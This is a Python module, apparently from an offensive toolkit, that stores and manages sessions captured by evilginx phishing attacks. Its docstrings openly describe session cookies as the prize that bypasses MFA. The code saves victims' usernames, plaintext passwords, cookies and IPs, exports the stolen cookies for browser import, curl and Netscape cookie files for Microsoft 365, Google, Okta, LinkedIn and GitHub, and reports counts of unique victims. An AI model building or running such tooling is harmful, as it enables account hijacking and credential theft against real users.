"""
Session Manager - Handle captured sessions from evilginx.

Sessions contain:
- Username/email captured from login form
- Password captured from login form  
- Session cookies (THE REAL PRIZE - bypasses MFA!)
- Metadata (IP, user agent, timestamp, etc.)

With session cookies, the attacker can:
1. Import cookies into their browser
2. Access the victim's account WITHOUT needing password or 2FA
3. Maintain access until the session expires
"""

from __future__ import annotations

import json
import logging
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class CapturedSession:
    """
    A captured session from evilginx.
    
    Contains everything needed to hijack a victim's account.
    """
    id: str
    phishlet: str
    
    # Credentials
    username: str
    password: str
    
    # THE PRIZE: Session cookies
    cookies: dict[str, str] = field(default_factory=dict)
    
    # Metadata
    victim_ip: str = ""
    user_agent: str = ""
    landing_url: str = ""
    
    # Timestamps
    captured_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    expires_at: datetime | None = None
    
    # Status
    exported: bool = False
    notes: str = ""
    
    @property
    def is_valid(self) -> bool:
        """Check if session is still valid (not expired)."""
        if not self.expires_at:
            # Assume 24h validity if no expiry set
            return (datetime.now(UTC) - self.captured_at) < timedelta(hours=24)
        return datetime.now(UTC) < self.expires_at
    
    @property
    def cookie_string(self) -> str:
        """Get cookies as string for browser import."""
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for JSON serialization."""
        return {
            "id": self.id,
            "phishlet": self.phishlet,
            "username": self.username,
            "password": self.password,
            "cookies": self.cookies,
            "victim_ip": self.victim_ip,
            "user_agent": self.user_agent,
            "landing_url": self.landing_url,
            "captured_at": self.captured_at.isoformat(),
            "expires_at": self.expires_at.isoformat() if self.expires_at else None,
            "exported": self.exported,
            "notes": self.notes,
            "is_valid": self.is_valid,
        }
    
    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> CapturedSession:
        """Create from dictionary."""
        return cls(
            id=data["id"],
            phishlet=data["phishlet"],
            username=data["username"],
            password=data["password"],
            cookies=data.get("cookies", {}),
            victim_ip=data.get("victim_ip", ""),
            user_agent=data.get("user_agent", ""),
            landing_url=data.get("landing_url", ""),
            captured_at=datetime.fromisoformat(data["captured_at"]) if data.get("captured_at") else datetime.now(UTC),
            expires_at=datetime.fromisoformat(data["expires_at"]) if data.get("expires_at") else None,
            exported=data.get("exported", False),
            notes=data.get("notes", ""),
        )
    
    def export_for_browser(self, domain: str) -> list[dict[str, Any]]:
        """
        Export cookies in a format that can be imported into a browser.
        
        Returns a list of cookie objects compatible with browser extensions
        like "Cookie Editor" or "EditThisCookie".
        """
        exported = []
        for name, value in self.cookies.items():
            exported.append({
                "name": name,
                "value": value,
                "domain": domain,
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "Lax",
            })
        return exported
    
    def export_for_curl(self, domain: str) -> str:
        """Export as curl command for testing."""
        cookie_header = self.cookie_string
        return f'curl -H "Cookie: {cookie_header}" https://{domain}/'


class SessionManager:
    """
    Manages captured sessions from evilginx attacks.
    
    Features:
    - Store and retrieve sessions
    - Export sessions for browser import
    - Track session validity
    - Generate reports
    """
    
    def __init__(self, data_dir: Path | None = None):
        self.data_dir = data_dir or Path("/opt/momo/evilginx_data")
        self._sessions: dict[str, CapturedSession] = {}
        self._load_sessions()
    
    def _get_sessions_file(self) -> Path:
        """Get path to sessions storage file."""
        self.data_dir.mkdir(parents=True, exist_ok=True)
        return self.data_dir / "captured_sessions.json"
    
    def _load_sessions(self) -> None:
        """Load sessions from disk."""
        sessions_file = self._get_sessions_file()
        if sessions_file.exists():
            try:
                data = json.loads(sessions_file.read_text())
                for session_data in data.get("sessions", []):
                    session = CapturedSession.from_dict(session_data)
                    self._sessions[session.id] = session
                logger.info("Loaded %d sessions", len(self._sessions))
            except Exception as e:
                logger.error("Failed to load sessions: %s", e)
    
    def _save_sessions(self) -> None:
        """Save sessions to disk."""
        sessions_file = self._get_sessions_file()
        data = {
            "sessions": [s.to_dict() for s in self._sessions.values()],
            "updated_at": datetime.now(UTC).isoformat(),
        }
        sessions_file.write_text(json.dumps(data, indent=2))
    
    def add_session(self, session: CapturedSession) -> None:
        """Add a captured session."""
        self._sessions[session.id] = session
        self._save_sessions()
        logger.info(
            "Session captured: %s (%s) - %d cookies",
            session.username,
            session.phishlet,
            len(session.cookies),
        )
    
    def get_session(self, session_id: str) -> CapturedSession | None:
        """Get a session by ID."""
        return self._sessions.get(session_id)
    
    def get_all_sessions(self) -> list[CapturedSession]:
        """Get all captured sessions."""
        return list(self._sessions.values())
    
    def get_valid_sessions(self) -> list[CapturedSession]:
        """Get sessions that are still valid (not expired)."""
        return [s for s in self._sessions.values() if s.is_valid]
    
    def get_sessions_by_phishlet(self, phishlet: str) -> list[CapturedSession]:
        """Get sessions for a specific phishlet."""
        return [s for s in self._sessions.values() if s.phishlet == phishlet]
    
    def delete_session(self, session_id: str) -> bool:
        """Delete a session."""
        if session_id in self._sessions:
            del self._sessions[session_id]
            self._save_sessions()
            return True
        return False
    
    def mark_exported(self, session_id: str) -> bool:
        """Mark a session as exported."""
        if session_id in self._sessions:
            self._sessions[session_id].exported = True
            self._save_sessions()
            return True
        return False
    
    def add_note(self, session_id: str, note: str) -> bool:
        """Add a note to a session."""
        if session_id in self._sessions:
            self._sessions[session_id].notes = note
            self._save_sessions()
            return True
        return False
    
    def export_session_cookies(
        self,
        session_id: str,
        format: str = "json",
    ) -> str | None:
        """
        Export session cookies in various formats.
        
        Formats:
        - json: JSON array for browser extension import
        - curl: curl command with cookie header
        - netscape: Netscape cookie file format
        - raw: Raw cookie string
        """
        session = self._sessions.get(session_id)
        if not session:
            return None
        
        # Determine domain from phishlet
        domain_map = {
            "microsoft365": ".login.microsoftonline.com",
            "google": ".google.com",
            "okta": ".okta.com",
            "linkedin": ".linkedin.com",
            "github": ".github.com",
        }
        domain = domain_map.get(session.phishlet, f".{session.phishlet}.com")
        
        if format == "json":
            cookies = session.export_for_browser(domain)
            return json.dumps(cookies, indent=2)
        
        elif format == "curl":
            return session.export_for_curl(domain.lstrip("."))
        
        elif format == "netscape":
            # Netscape cookie file format
            lines = ["# Netscape HTTP Cookie File"]
            for name, value in session.cookies.items():
                # domain, flag, path, secure, expiry, name, value
                lines.append(f"{domain}\tTRUE\t/\tTRUE\t0\t{name}\t{value}")
            return "\n".join(lines)
        
        elif format == "raw":
            return session.cookie_string
        
        return None
    
    def get_stats(self) -> dict[str, Any]:
        """Get session statistics."""
        sessions = list(self._sessions.values())
        valid = [s for s in sessions if s.is_valid]
        exported = [s for s in sessions if s.exported]
        
        # Group by phishlet
        by_phishlet: dict[str, int] = {}
        for s in sessions:
            by_phishlet[s.phishlet] = by_phishlet.get(s.phishlet, 0) + 1
        
        return {
            "total_sessions": len(sessions),
            "valid_sessions": len(valid),
            "expired_sessions": len(sessions) - len(valid),
            "exported_sessions": len(exported),
            "sessions_by_phishlet": by_phishlet,
            "unique_victims": len(set(s.username for s in sessions)),
        }
    
    def generate_report(self) -> str:
        """Generate a text report of all captured sessions."""
        lines = [
            "=" * 60,
            "EVILGINX SESSION CAPTURE REPORT",
            f"Generated: {datetime.now(UTC).isoformat()}",
            "=" * 60,
            "",
        ]
        
        stats = self.get_stats()
        lines.append(f"Total Sessions: {stats['total_sessions']}")
        lines.append(f"Valid Sessions: {stats['valid_sessions']}")
        lines.append(f"Unique Victims: {stats['unique_victims']}")
        lines.append("")
        
        for session in self._sessions.values():
            lines.append("-" * 40)
            lines.append(f"ID: {session.id}")
            lines.append(f"Target: {session.phishlet}")
            lines.append(f"Username: {session.username}")
            lines.append(f"Password: {'*' * len(session.password)}")
            lines.append(f"Cookies: {len(session.cookies)} captured")
            lines.append(f"Valid: {'Yes' if session.is_valid else 'No (EXPIRED)'}")
            lines.append(f"Captured: {session.captured_at.isoformat()}")
            if session.victim_ip:
                lines.append(f"Victim IP: {session.victim_ip}")
            lines.append("")
        
        return "\n".join(lines)

